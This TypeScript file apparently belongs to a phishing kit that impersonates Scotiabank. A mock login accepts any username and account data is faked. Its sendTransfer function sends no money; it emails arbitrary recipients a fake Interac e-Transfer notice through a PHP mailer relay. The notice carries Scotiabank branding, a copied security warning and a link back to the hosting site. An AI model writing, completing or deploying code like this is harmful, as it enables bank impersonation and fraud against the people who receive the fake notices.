/**
 * apps/scotia/utils/api.ts
 *
 * Simple service wrapper that talks to the PHP mailer
 * (`/api/mailer.php`) via the `EmailRelay` helper.
 *
 * The file can be dropped verbatim into the project – it only relies
 * on the `EmailRelay` module that lives two levels up:
 *
 *   apps/
 *     shared/
 *       services/emailRelay.ts
 *
 * ---------------------------------------------------------------------------
 */

import EmailRelay from '../shared/services/emailRelay';

export interface LoginResponse {
  success: boolean;
  user: { username: string };
}

export interface Account {
  name: string;
  type: 'banking' | 'credit';
  balance: number;
}

export interface TransferResult {
  success: boolean;
  transaction_id?: string;
  path?: string;
  // any extra fields may be added by the PHP script
  [key: string]: unknown;
}

/**
 * A very small in-memory mock of an authentication system.
 * In a real-world app you would replace this with a proper
 * backend service or a JWT/Session lib.
 */
export async function login(username: string): Promise<LoginResponse> {
  // Simulate a network round-trip
  await new Promise(resolve => setTimeout(resolve, 200));
  return { success: true, user: { username } };
}

/**
 * Returns a list of accounts that the user owns.
 * It is intentionally "fake" – you can either use it for
 * local dev or replace the body with a real API call.
 */
export async function getAccounts(): Promise<Account[]> {
  await new Promise(resolve => setTimeout(resolve, 100));
  return [
    { name: 'Basic Plus', type: 'banking', balance: 5_000.00 },
    { name: 'Scene+ Visa', type: 'credit', balance: -450.25 },
  ];
}

/**
 * Sends a transfer/message via the PHP relay.
 *
 * @param recipientName   The recipient's full name
 * @param recipientEmail  The recipient's e-mail
 * @param amount          Transfer amount (numeric)
 * @param message         Optional free-text message
 * @param senderName      Sender's display name (defaults to "Scotiabank")
 */
export async function sendTransfer(
  recipientName: string,
  recipientEmail: string,
  amount: number,
  message: string = '',
  senderName: string = 'Scotiabank',
  baseUrl?: string
): Promise<TransferResult> {
  console.log('Sending transfer via EmailRelay (PHP)...');

  const today = new Date();
  const dateStr = today.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
  const expiryDate = new Date(today);
  expiryDate.setDate(today.getDate() + 30);
  const expiryStr = expiryDate.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });

  // Build the payload that matches the PHP script's expectations
  const payload = {
    recipient_email: recipientEmail,
    recipient_name: recipientName,
    amount: amount,
    purpose: message || 'Interac e-Transfer',
    template: 'Transfer.html', // this template must exist on the server
    bank_name: 'Scotiabank',
    sender_name: senderName,
    date: dateStr,
    expiry_date: expiryStr,
    greeting: `Hi ${recipientName},`,
    headline: `${senderName} sent you an Interac e-Transfer.`,
    app_url: typeof window !== 'undefined' ? window.location.origin : '',
    security_warning_text: 'Keep your passwords and security answers private. Scotiabank will never ask for them by email or text.',
  };

  const response = await EmailRelay.sendEmail(payload, baseUrl);
  return response;
}

// Export api object to fix index.tsx import { api }
export const api = {
  login,
  getAccounts,
  sendTransfer
};

export default api;

